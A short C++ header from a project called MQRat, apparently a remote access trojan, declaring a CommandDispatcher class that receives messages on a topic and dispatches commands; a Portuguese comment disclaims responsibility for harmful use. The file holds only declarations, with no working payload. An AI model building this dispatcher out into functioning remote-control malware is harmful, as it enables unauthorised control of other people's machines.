/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef COMMAND_DISPATCHER_HPP
#define COMMAND_DISPATCHER_HPP

#define MAX_CMD_SIZE    400

/**
 * @brief The command dispatcher entity
 * 
 */
class CommandDispatcher {
    public:
        CommandDispatcher();
        explicit CommandDispatcher(void *msg, void *client, char *topic);
        void Dispatch();
        void setMessage(void *new_msg);
        void setTopic(char *topic_name);
    private:
        void *message;
        void *client;
        char *topic;
};

#endif
